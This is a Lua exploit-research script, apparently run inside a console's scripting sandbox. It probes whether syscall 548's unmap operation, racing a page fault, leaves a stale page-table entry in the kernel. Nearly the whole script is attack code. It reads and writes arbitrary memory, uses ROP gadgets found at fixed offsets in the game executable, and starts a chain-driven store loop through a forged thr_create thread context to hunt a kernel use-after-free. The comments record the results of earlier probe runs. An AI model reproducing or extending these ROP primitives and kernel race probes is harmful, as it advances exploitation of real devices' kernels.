-- CRASH_CLASS: HIGH (expected to end the run on the negative branch)
-- PROBE 1554a: does 548 op 1 racing a FIRST-TOUCH page fault install a PTE on an
--              entry that is already gone?
--              A death is the answer here, not a failure.
--
-- prior art:
--   results/phase36_realargs/1556a_child_fault_survivability_20261110_192412.txt —
--     MEASURED THIS SESSION: one thr_create(430) child whose first store lands on
--     an unmapped user VA ends the whole run. The parent never printed again
--     (child RIP = store gadget, rdi = 0x200000000, RSP untouched). So a child
--     fault is NOT contained, which contradicts the CLAUDE.md line that 1331a
--     showed containment — that was kernel-VA faults, a different class.
--     CONSEQUENCE: a probe must never depend on outliving the child's fault.
--   results/phase36_realargs/1553a_munmap_vs_store_race_20261110_192006.txt —
--     the same race before that was known: the child stored ~1938 times and then
--     faulted at the store gadget with rdi = the unmapped page, and the capture
--     ended with no trick of ours able to say whether op 1 had returned. That run
--     is graded V purely because the verdict printed after the lethal call.
--   docs/VM_LAYER_14_10.md §15 (1537a/1537b) — op 1 is a precise munmap: four
--     ranges removed, and the middle page of a 256 KiB entry split out. Those
--     runs prove op 1 alone does not kill the process, which is the control this
--     probe repeats in [A] so the interpretation does not depend on an old run.
--   docs/VM_LAYER_14_10.md §19 and §13.1 — the protect-versus-munmap race is
--     closed statically, but the delete-versus-STORE pair is a different lock
--     user: vm_fault drops the map lock before pmap_enter.
--   CLAUDE.md — gadgets `mov [rdi],rax;ret` eboot+0x92C67, `pop rdi;ret`
--     +0xC9DFE, `pop rax;ret` +0x992; thr_create gates +0x108/+0x0d0/+0x110 and
--     CS/SS/RIP/RSP at +0x0c0/+0x100/+0x0e0/+0x0f8.
--   Review1553a-b — the 6-slot walk {Pv, STORE, POP_RDI, Hv, STORE, POP_RDI}
--     with RIP=POP_RDI, RSP=base was verified slot by slot; the arm check must be
--     write-then-read or a child that died early still reads as armed.
--
--   results/phase36_realargs/1557a_unmap_pte_removal_20261110_192806.txt —
--     MEASURED: with the store aimed at a RESIDENT page, the child faulted on
--     its first post-unmap store and no PTE survived. But a resident store never
--     enters vm_fault, so that run says nothing about the fault path. vm_fault
--     takes the map lock, DROPS it, and calls pmap_enter afterwards; if
--     vm_map_delete completes inside that window, pmap_enter installs a PTE for
--     an entry that no longer exists. That is the window this probe aims at.
--
-- Consequence: P must NOT be touched before the race -- no zero(), no arm-check
-- read. A virgin anonymous page makes the child's first store take a fault, which
-- is the whole point. The heartbeat page H is still written by the child AFTER a
-- successful P store, so H is the bug signal: it can only be reached by a store
-- into P that succeeded.
--
-- Protocol, chosen because the negative branch cannot be survived:
--   1. [A] a control: op 1 on a page with NO child. If the process survives it,
--      a later death cannot be blamed on op 1 itself.
--   2. [B] start the store loop, confirm it is running by zeroing P and H and
--      requiring both back at MARKER.
--   3. Print the interpretation, THEN unmap.
--   4. Print the unmap's rv immediately after.
-- Interpretation of the capture:
--   * ends after the UNMAP line, followed by the loader's fault dump
--       -> the child's store faulted on the removed page: PTEs were gone.
--   * reaches the post-unmap lines and the heartbeat reads MARKER
--       -> the child was still storing into P after op 1 returned: STALE PTE.
--   * reaches the post-unmap lines and the heartbeat reads zero
--       -> the child was gone before the unmap; the run proves nothing.

print("=== PROBE 1554a: 548 op1 vs a first-touch fault ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function N(v) return to_num(v) end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(uint64(a)) end)
    if ok then return v end
    return nil
end
local function rqn(a) return to_num(rq(a) or 0) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok then return to_num(v) end
    return nil
end
local function wq(a, v) pcall(function() memory.write_qword(uint64(a), uint64(v)) end) end
local function wd(a, v) pcall(function() memory.write_dword(uint64(a), uint64(v)) end) end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid     = mk(20)
local sc_thr_create = mk(430)
local sc_nanosleep  = mk(240)
local sc_mmap       = mk(477)
local sc_547        = mk(547)
local sc_548        = mk(548)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078
local MARKER = 0xDEADBEEF  -- 32-bit on purpose: see 1555a/1559a, 64-bit ms

local function sleep_ms(ms)
    local ts = memory.alloc(16)
    zero(ts, 16)
    wd(ts, math.floor(ms / 1000))
    wd(ts + 8, (ms % 1000) * 1000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end
local function mmap_anon(len)
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(len), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return nil end
    local n = to_num(v)
    if n < 0x1000 or n > 549755813888 then return nil end
    if n % 0x4000 ~= 0 then return nil end
    return n
end
local function prot_of(addr)
    local rec = memory.alloc(0x40)
    zero(rec, 0x40)
    local ok, rv = pcall(function()
        return sc_547(uint64(addr), uint64(rec), uint64(0x40),
                      uint64(0), uint64(0), uint64(0))
    end)
    if not ok then return nil, -999 end
    local r = to_num(rv)
    if r ~= 0 then return nil, r end
    return rd(rec + 0x10), r
end

-- ---- [0] prerequisites ----
print(string.format("[0] pid=%s", tostring(to_num(sc_getpid()))))
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local tlo, thi = rd(info + 0x108), rd(info + 0x10C)
if not tlo then
    print("=== ABORT: no eboot base ===")
    return
end
local eboot = uint64(string.format("0x%X%08X", thi or 0, tlo))
local STORE = eboot + 0x92C67
local a, b = rb(STORE), rb(STORE + 1)
print(string.format("[0] eboot=%s store=%s = %02X %02X (want 48 89)",
    q(eboot), q(STORE), a or -1, b or -1))
if not (a == 0x48 and b == 0x89) then
    print("=== ABORT: gadget moved ===")
    return
end
local function qbytes(addr)
    local v = to_num(addr)
    local out = {}
    for i = 1, 8 do
        out[i] = string.char(v % 256)
        v = math.floor(v / 256)
    end
    return table.concat(out)
end
local STORE_B = qbytes(STORE)

local ent = memory.alloc(0x40)
local done = memory.alloc(8)
local function prep(start, len, prot, op)
    zero(ent, 0x40)
    wd(ent + 0x00, start % 4294967296)
    wd(ent + 0x04, math.floor(start / 4294967296))
    wd(ent + 0x10, len % 4294967296)
    wd(ent + 0x14, math.floor(len / 4294967296))
    wd(ent + 0x18, prot)
    pcall(function() memory.write_byte(uint64(ent + 0x1C), op) end)
    wd(done, 0xEEEEEEEE)
end
local function fire()
    local ok, rv = pcall(function()
        return sc_548(uint64(0), uint64(0), uint64(ent), uint64(1),
                      uint64(done), uint64(0))
    end)
    return ok and to_num(rv) or -999, rd(done)
end

-- ---- [A] control: op 1 on a page with no child racing it ----
local Q = mmap_anon(0x4000)
if not Q then
    print("=== ABORT: no control page ===")
    return
end
zero(Q, 0x4000)
local pq = prot_of(Q)
print(string.format("[A] control Q=0x%X prot=%s", Q, tostring(pq)))
prep(Q, 0x4000, 3, 1)
local rvQ, procQ = fire()
local pq2 = prot_of(Q)
print(string.format("[A] 548 op1(Q) rv=%d processed=%s, 547 after=%s (want -1)",
    rvQ, tostring(procQ), tostring(pq2)))
if rvQ ~= 0 or procQ ~= 1 or pq2 ~= nil then
    print("=== ABORT: the control failed; op1 is not the instrument assumed ===")
    return
end
print("[A] CONTROL OK: op 1 on a QUIESCENT page survives. A death in [B] is either")
print("[A] the child's store fault or the racing delete; the dump's RIP/RDI decides.")
print("")

-- ---- [B] the race ----
local Pv = mmap_anon(0x4000)
local Hv = mmap_anon(0x4000)
if not Pv or not Hv or Pv == Hv then
    print("=== ABORT: no pages ===")
    return
end
-- P is deliberately NOT touched: the child's first store must fault.
zero(Hv, 0x4000)
print(string.format("[B] H after zero            = 0x%X", N(rqn(Hv))))
local hPre = N(rqn(Hv))
if hPre ~= 0 then
    print(string.format("=== VOID: H=0x%X held 0x%X after zero(); the page is not fresh ===",
        N(Hv), hPre))
    return
end
print(string.format("[B] H after                        = 0x%X", N(rqn(Hv))))
local Sv = mmap_anon(0x800000 + 0x4000)
if not Sv then
    print("=== ABORT: no stack ===")
    return
end
print(string.format("[B] P=0x%X H=0x%X stack=0x%X", Pv, Hv, Sv))

print(string.format("[B] H after stack mmap             = 0x%X", N(rqn(Hv))))
local ctx = memory.alloc(0x500)
local tid = memory.alloc(8)
-- The loader's allocator and a 477 mapping can hand out the same address:
-- 1554a's ctx landed inside its own heartbeat page, so arm() wrote MARKER into H
-- and the pre-spawn "H reads ..." check reported it. Refuse to run like that.
local ctxn = to_num(ctx)
local function overlaps(a, n)
    for _, r in ipairs({ { Pv, 0x4000 }, { Hv, 0x4000 }, { Sv, 0x804000 } }) do
        local b, len = r[1], r[2]
        if a < b + len and b < a + n then return b end
    end
    return nil
end
local hit = overlaps(ctxn, 0x500)
print(string.format("[B] ctx=0x%X tid=0x%X", ctxn, to_num(tid)))
if hit then
    print(string.format("=== VOID: memory.alloc landed at 0x%X, inside a mapped page (0x%X) ===",
        ctxn, hit))
    return
end
local function arm(rip, rsp, rdi)
    zero(ctx, 0x500)
    zero(tid, 8)
    wq(ctx + C_MAGIC, 0x480)
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, 0x10000)
    wq(ctx + C_CS, 0x43)
    wq(ctx + C_SS, 0x3B)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RAX, MARKER)
end
-- 6-slot cycle, RIP = POP_RDI: slot0 P | slot1 STORE | slot2 pop_rdi | slot3 H |
-- slot4 STORE | slot5 pop_rdi. Verified slot by slot in Review1553a-b.
local POP_RDI = eboot + 0xC9DFE
local blk = { Pv, STORE, POP_RDI, Hv, STORE, POP_RDI }
local pat = {}
for i = 1, 6 do pat[i] = qbytes(blk[i]) end
pat = table.concat(pat)
local okwalk = pcall(function()
    memory.write_buffer(uint64(Sv), string.rep(pat, math.floor(0x800000 / 48)))
end)
print(string.format("[B] walk fill ok=%s (period 48 bytes, %d periods)",
    tostring(okwalk), math.floor(0x800000 / 48)))
if not okwalk then
    print("=== ABORT: walk fill ===")
    return
end

print(string.format("[B] H after alloc                  = 0x%X", N(rqn(Hv))))
arm(POP_RDI, Sv, 0)
print(string.format("[B] H after arm                    = 0x%X", N(rqn(Hv))))
local okC, rvC = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid))
end)
local rvCn = okC and to_num(rvC) or -999
local tidn = rqn(tid)
print(string.format("[B] no arm check: P is virgin (first store faults), and H is only "
    .. "reachable through a store into P that succeeded. H reads 0x%X now.", rqn(Hv)))
print(string.format("[B] >>> CLEAN RESULT = the capture ends after the next two lines and"))
print(string.format("[B] >>> the fault dump decodes to RIP=%s rdi=0x%X (the store on P).",
    q(STORE), N(Pv)))
print("[B] >>> RIP=0, or RSP at the top of the fill, means the walk ran off its")
print("[B] >>> 174762 periods -- a probe artifact, NOT a removed PTE.")
print("[B] >>> No dump at all means the run died inside 548 with a live writer,")
print("[B] >>> which [A] (quiescent page) never tested for.")
print(string.format("[B] thr_create rv=%d tid=0x%X", rvCn, tidn))
if rvCn ~= 0 then
    print("=== VOID: no child ===")
    return
end

-- There is deliberately NO arm check here. P cannot be probed without populating
-- it, and H cannot be probed because it is only reachable after a successful
-- store into P, which is exactly the event under test. Liveness is therefore
-- established by design, not by measurement, and the read below is only for the
-- record.
prep(Pv, 0x4000, 3, 1)   -- fire() sends whatever entry prep() last built; without
                         -- this the call repeats op1 on Q and P is untouched
local rvU, procU = fire()

print(string.format("[B] op1 rv=%d processed=%s", rvU, tostring(procU)))
local pq3 = prot_of(Pv)
print(string.format("[B] 547(P) after=%s (want nil = unmapped)", tostring(pq3)))

local function hb()
    wq(Hv, 0)
    return rqn(Hv)
end
local h1 = hb()
local h2 = hb()
print(string.format("[B] heartbeat after the unmap: h1=0x%X h2=0x%X", h1, h2))
if h1 == MARKER or h2 == MARKER then
    if rvU ~= 0 or procU ~= 1 or pq3 ~= nil then
        print("=== VOID: the unmap did not take effect; the heartbeat says nothing ===")
        return
    end
    print("[B] *** STALE PTE: the child stored into H after op1 returned, and H  ***")
    print("[B] *** is only reachable through a store into P that SUCCEEDED, so  ***")
    print("[B] *** pmap_enter installed a PTE on the deleted entry              ***")
else
    print("[B] H stayed zero: the fault was never serviced into P after op1")
    print("[B] returned. (This branch is only reached if the fatal fault was")
    print("[B] somehow contained; that the process is still here is itself odd.)")
end
print("=== PROBE 1554a COMPLETE ===")
